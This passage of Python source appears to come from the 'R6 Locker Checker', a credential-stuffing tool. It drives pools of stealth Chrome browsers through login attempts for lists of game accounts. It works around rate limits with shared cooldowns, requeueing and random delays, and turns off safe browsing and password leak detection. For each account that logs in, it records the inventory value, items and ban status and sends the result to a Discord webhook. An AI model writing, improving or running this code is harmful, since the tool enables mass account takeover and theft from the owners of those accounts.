        # Periodic popup close
        if int(elapsed * 2) % 2 == 0:
            browser.js(JS_CLOSE_POPUP)
        
        time.sleep(interval)
    
    return Result(account, Status.TIMEOUT, error="Timeout", duration=time.time()-start)


# ═══════════════════════════════════════════════════════════════════════════════
#                              WORKER POOL
# ═══════════════════════════════════════════════════════════════════════════════

class Pool:
    def __init__(self, num: int, stats: Stats, results: Results, webhook: Webhook, src: str, headless: bool = False):
        self.num = num
        self.stats = stats
        self.results = results
        self.webhook = webhook
        self.src = src
        self.headless = headless
        self._queue: Queue = Queue()
        self._workers: List[Thread] = []
        self._stop = Event()
        self._rate_limit_until = 0.0  # Shared rate limit cooldown
        self._rate_limit_lock = Lock()

    def start(self, accounts: List[Account]):
        for a in accounts:
            self._queue.put(a)
        for i in range(self.num):
            t = Thread(target=self._loop, args=(i+1,), daemon=True)
            t.start()
            self._workers.append(t)
            time.sleep(cfg.worker_stagger)

    def wait(self):
        for t in self._workers:
            t.join()
        self.results.flush()

    def stop(self):
        self._stop.set()
        while not self._queue.empty():
            try:
                self._queue.get_nowait()
                self._queue.task_done()
            except Empty:
                break

    def _loop(self, wid: int):
        UI.worker(wid, "Starting browser...")
        max_restarts, restarts = 3, 0
        
        while restarts < max_restarts and not self._stop.is_set():
            temp_dir = None
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                async def setup():
                    xpos = 10 + (wid-1) * (cfg.window_width + 10)
                    td = tempfile.mkdtemp(prefix=f"r6_w{wid}_")
                    prefs = {
                        "credentials_enable_service": False,
                        "profile": {"password_manager_enabled": False},
                        "password_manager": {"enabled": False},
                        "autofill": {"profile_enabled": False, "credit_card_enabled": False},
                        "safebrowsing": {"enabled": False}
                    }
                    os.makedirs(os.path.join(td, "Default"), exist_ok=True)
                    with open(os.path.join(td, "Default", "Preferences"), "w") as f:
                        json.dump(prefs, f)
                    
                    br = await uc.start(headless=self.headless, user_data_dir=td, browser_args=[
                        f"--window-size={cfg.window_width},{cfg.window_height}",
                        f"--window-position={xpos},50", "--disable-infobars", "--disable-notifications",
                        "--disable-save-password-bubble", "--no-first-run", "--disable-sync",
                        "--disable-features=TranslateUI,PasswordLeakDetection,AutofillServerCommunication",
                        "--disable-password-manager-reauthentication",
                        "--disable-background-networking",
                        "--disable-background-timer-throttling",
                        "--disable-backgrounding-occluded-windows",
                        "--disable-breakpad",
                        "--disable-component-extensions-with-background-pages",
                        "--disable-default-apps",
                        "--disable-dev-shm-usage",
                        "--disable-extensions",
                        "--disable-hang-monitor",
                        "--disable-popup-blocking",
                        "--disable-prompt-on-repost",
                        "--disable-renderer-backgrounding",
                        "--disable-translate",
                        "--metrics-recording-only",
                        "--no-crash-upload",
                        "--no-default-browser-check",
                        "--no-pings",
                        "--password-store=basic",
                        "--use-mock-keychain",
                        "--log-level=3"])
                    tab = br.main_tab
                    await tab.get(cfg.target_url)
                    return br, tab, td
                
                browser_obj, tab, temp_dir = loop.run_until_complete(setup())
                time.sleep(0.15)
                UI.worker(wid, f"{C.B_GREEN}Ready{C.RESET}")
                bw = Browser(tab, browser_obj, loop)
                
                alive = True
                while not self._stop.is_set() and alive:
                    # Check if we're in rate limit cooldown
                    with self._rate_limit_lock:
                        if time.time() < self._rate_limit_until:
                            wait = self._rate_limit_until - time.time()
                            if wait > 0:
                                UI.worker(wid, f"{C.B_YELLOW}Rate limit cooldown: {wait:.0f}s{C.RESET}")
                                time.sleep(min(wait, 5.0))
                                continue
                    
                    try:
                        acc = self._queue.get(timeout=1.0)
                    except Empty:
                        break
                    
                    result = check_account(bw, acc)
                    
                    # Only count as processed if we got a FINAL result (SUCCESS or INVALID)
                    if result.status in (Status.SUCCESS, Status.INVALID):
                        self.stats.add(result.duration)
                    rem = self.stats.remaining
                    
                    if result.success:
                        # SUCCESS - account is valid, done with it
                        self.stats.hit()
                        self.results.save(result)
                        self.webhook.send(result)
                        bi = f" │ {result.black_ices} BI" if result.black_ices and result.black_ices != "0" else ""
                        el = f" │ {result.elites} Elites" if result.elites and result.elites != "0" else ""
                        mv = f" │ ${int(result.marketplace):,}" if result.marketplace and result.marketplace != "0" else ""
                        rn = f" │ {int(result.renown):,}R" if result.renown and result.renown != "0" else ""
                        cr = f" │ {result.credits}C" if result.credits and result.credits != "0" else ""
                        ban = f" │ {C.B_RED}BANNED ({result.ban_source}){C.RESET}" if result.banned else ""
                        det = f"{result.username} │ Lv{result.level} │ {result.items} items{bi}{el}{mv}{rn}{cr} │ {result.platform}{ban}"
                        UI.valid(acc.index, self.stats.total, rem, acc.email, det)
                    elif result.status == Status.INVALID:
                        # INVALID - account is bad, done with it
                        self.stats.inv()
                        self.stats.miss()
                        self.results.mark_failed(acc.email)
                        UI.invalid(acc.index, self.stats.total, rem, acc.email)
                    elif result.status == Status.RATE_LIMITED:
                        # RATE LIMITED - retry after cooldown, NEVER skip
                        with self._rate_limit_lock:
                            self._rate_limit_until = time.time() + 30.0
                        UI.worker(wid, f"{C.B_RED}⚠ RATE LIMITED [{acc.email[:20]}...] - retry in 30s{C.RESET}")
                        self._queue.put(acc)  # Put back for retry
                        time.sleep(5.0)
                        continue  # Skip the delay at end, go to cooldown check
                    elif result.status == Status.TIMEOUT:
                        # TIMEOUT - retry, NEVER skip
                        UI.worker(wid, f"{C.B_YELLOW}⏱ TIMEOUT [{acc.email[:20]}...] - retrying{C.RESET}")
                        self._queue.put(acc)  # Put back for retry
                        time.sleep(1.0)  # Brief pause before retry
                        continue  # Skip the delay at end
                    else:
                        # ERROR - retry, NEVER skip (unless browser died)
                        UI.worker(wid, f"{C.B_YELLOW}⚠ ERROR [{acc.email[:20]}...] {result.error} - retrying{C.RESET}")
                        if bw.dead():
                            # Browser died, put account back and restart browser
                            self._queue.put(acc)
                            alive = False
                        else:
                            # Browser ok, just retry
                            self._queue.put(acc)
                            time.sleep(1.0)
                            continue
                    
                    if self.stats.processed % cfg.flush_every == 0:
                        self.results.flush()
                    
                    time.sleep(cfg.inter_delay + random.uniform(0.1, 0.4))
                
                try:
                    browser_obj.stop()
                except:
                    pass
                loop.close()
                if alive:
                    break
                    
            except Exception:
                restarts += 1
                if restarts < max_restarts:
                    UI.worker(wid, f"{C.B_YELLOW}Crashed ({restarts}/{max_restarts}){C.RESET}")
                    time.sleep(0.5)
            finally:
                if temp_dir:
                    shutil.rmtree(temp_dir, ignore_errors=True)
        
        UI.worker(wid, f"{C.DIM}Finished{C.RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#                              MAIN APP
# ═══════════════════════════════════════════════════════════════════════════════

class App:
    def __init__(self, accounts_file: str, headless: bool = False):
        self.accounts_file = accounts_file
        self.headless = headless
        self.stats = Stats()
        self.results = Results(cfg.results_dir)
        self.webhook = Webhook()
        self.pool: Optional[Pool] = None
        atexit.register(self._cleanup)

    def _load_webhook(self) -> Optional[str]:
        p = Path(cfg.webhook_file)
        if not p.exists():
            return None
        for ln in p.read_text().splitlines():
            ln = ln.strip()
            if ln and not ln.startswith("#") and "discord.com/api/webhooks" in ln:
                return ln
        return None

    def _cleanup(self):
        self.webhook.stop()
        self.results.flush()

    def run(self):
        clear()
        UI.banner()
        UI.section("INITIALIZATION")
        
        try:
            accounts = load_accounts(self.accounts_file, cfg.shuffle)
            msg = f"Loaded {C.BOLD}{len(accounts)}{C.RESET} accounts"
            if cfg.shuffle:
                msg += f" {C.DIM}(shuffled){C.RESET}"
            UI.ok(msg)
        except FileNotFoundError as e:
            UI.fail(str(e))
            return
        
        if not accounts:
            UI.fail("No valid accounts found")
            return
        
        self.stats.total = len(accounts)
        
        url = self._load_webhook()
        if url:
            self.webhook = Webhook(url)
            self.webhook.start()
            UI.ok("Webhook enabled")
        else:
            UI.info("Webhook not configured")
        
        self.results.init()
        UI.ok(f"Output: {C.B_WHITE}{self.results.output_file}{C.RESET}")
        
        UI.section("CONFIGURATION")
        UI.info(f"Workers: {C.BOLD}{cfg.max_workers}{C.RESET}")
        UI.info(f"Timeout: {C.BOLD}{cfg.login_timeout}s{C.RESET}")
        UI.info(f"Mode: {C.BOLD}{'Headless' if self.headless else 'Visible'}{C.RESET}")
        
        UI.section("READY")
        input(f"  {C.DIM}Press Enter to start...{C.RESET}")
        
        UI.section("CHECKING")
        
        self.pool = Pool(cfg.max_workers, self.stats, self.results, self.webhook, self.accounts_file, self.headless)
        self.pool.start(accounts)
        self.pool.wait()
        
        if cfg.remove_failed:
            removed = self.results.remove_failed_from_source(self.accounts_file)
            if removed:
                UI.info(f"Removed {removed} invalid from source")
        
        UI.summary(self.stats)
        UI.info(f"Results: {C.B_WHITE}{self.results.output_file}{C.RESET}")
        if self.results.json_file:
            UI.info(f"JSON: {C.B_WHITE}{self.results.json_file}{C.RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#                              CLI
# ═══════════════════════════════════════════════════════════════════════════════

_app: Optional[App] = None


def signal_handler(sig, frame):
    print(f"\n{C.B_YELLOW}⚠ Shutting down...{C.RESET}")
    if _app and _app.pool:
        _app.pool.stop()
    sys.exit(0)


def main():
    global _app
    
    parser = argparse.ArgumentParser(description=f"R6 Locker Checker v{__version__}")
    parser.add_argument("accounts_file", nargs="?", default=cfg.accounts_file)
    parser.add_argument("-w", "--workers", type=int)
    parser.add_argument("--headless", action="store_true")
    parser.add_argument("--shuffle", action="store_true")
    parser.add_argument("--timeout", type=int)
    parser.add_argument("-v", "--version", action="version", version=f"v{__version__}")
    args = parser.parse_args()
    
    if args.workers:
        cfg.max_workers = max(1, min(args.workers, 10))
    if args.timeout:
        cfg.login_timeout = max(15, args.timeout)
    if args.shuffle:
        cfg.shuffle = True
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    if sys.platform == "win32":
        try:
            signal.signal(signal.SIGBREAK, signal_handler)
        except:
            pass
    
    try:
        _app = App(args.accounts_file, args.headless)
        _app.run()
    except KeyboardInterrupt:
        print(f"\n{C.B_YELLOW}Interrupted{C.RESET}")
        if _app and _app.pool:
            _app.pool.stop()
    finally:
        _app = None


if __name__ == "__main__":
    main()
